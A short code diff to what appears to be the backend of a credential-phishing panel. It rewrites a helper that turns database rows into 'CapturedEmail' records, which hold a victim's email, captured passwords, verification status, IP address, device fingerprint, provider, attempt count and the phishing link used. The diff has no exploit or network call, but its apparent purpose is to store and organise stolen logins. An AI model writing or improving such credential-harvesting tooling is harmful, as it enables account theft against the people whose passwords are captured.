@@ -94,15 +94,38 @@ function mapRowToLink(row: any): Link {
 
 // Helper to map DB row to CapturedEmail object
 function mapRowToCapturedEmail(row: any): CapturedEmail {
+  // Get link data if link_id exists
+  let linkData: Link | null = null
+  if (row.link_id) {
+    try {
+      // We need to get the link by ID, but getLink expects sessionIdentifier
+      // So we'll query directly
+      const db = getDb()
+      const linkRow = db.prepare('SELECT * FROM links WHERE id = ?').get(row.link_id) as any
+      if (linkRow) {
+        linkData = mapRowToLink(linkRow)
+      }
+    } catch {
+      // Link lookup failed, continue without link data
+    }
+  }
+
   return {
-    ...row,
+    id: row.id,
+    email: row.email,
+    sessionIdentifier: linkData?.sessionIdentifier || undefined,
+    linkToken: linkData?.linkToken || linkData?.sessionIdentifier || undefined,
+    linkType: linkData?.type || 'generic',
+    linkName: linkData?.name || null,
+    fingerprint: row.fingerprint,
+    ip: row.ip,
     passwords: parseJSON(row.passwords) || [],
     verified: Boolean(row.verified),
+    provider: row.provider || 'Unknown',
     // Map snake_case database columns to camelCase TypeScript interface
     capturedAt: row.captured_at || row.capturedAt || Date.now(),
+    attempts: row.attempts || 0,
     mxRecord: row.mx_record || row.mxRecord || 'Not available',
-    sessionIdentifier: row.sessionIdentifier || row.session_identifier,
-    linkToken: row.linkToken || row.link_token,
   }
 }
 
